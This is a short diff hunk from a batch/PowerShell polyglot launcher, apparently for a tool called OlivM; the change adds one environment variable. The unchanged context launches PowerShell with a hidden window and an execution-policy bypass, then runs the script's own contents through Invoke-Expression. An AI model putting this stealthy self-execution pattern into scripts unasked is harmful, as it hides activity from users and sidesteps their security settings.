@@ -2,6 +2,7 @@
 @echo off
 set "_OLIVM_SELF=%~f0"
 set "_OLIVM_HIDDEN=1"
+set "_OLIVM_EXE="
 start "" /min "%windir%\System32\conhost.exe" "%windir%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -STA -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$global:_OlivMScriptPath=$env:_OLIVM_SELF; Invoke-Expression ([IO.File]::ReadAllText($env:_OLIVM_SELF, [Text.Encoding]::UTF8))"
 exit /b
 #>
